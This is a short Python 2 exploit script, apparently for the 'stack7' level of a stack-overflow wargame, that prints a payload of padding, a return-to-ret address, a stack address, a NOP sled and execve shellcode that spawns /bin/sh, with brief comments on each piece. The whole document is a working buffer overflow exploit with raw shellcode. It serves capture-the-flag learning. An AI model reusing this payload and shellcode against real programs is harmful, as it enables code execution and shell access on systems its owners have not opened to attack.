#!/usr/bin/python
import struct



#NOTE
#You have to run cat with this exploit to match the input with the output
#(./exploit.py ; cat) | ./stack7

PAD = "A" * 80
#Fill Up The Stack Buffer.
RET = struct.pack("I" , 0x08048544)
#The ret Address To jump to ret again
STACK = struct.pack("I" , 0xbffff6d0 + 30)
#The address of the stack where the program stops ( + 30 ) to jumps into the nops 
NOPS = "\x90" * 152
#Nops is just a no operation instruction and its code is \x90..
#To bypass the changes in the stack for the env variables.
INT = "\xCC" * 4
#The Int3 to the trape its instruct for stop execution (BreakPoint)
SHELL = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" 
#The shell code ..u can use any shell here..

exploit = PAD + RET + STACK + NOPS + SHELL

print exploit
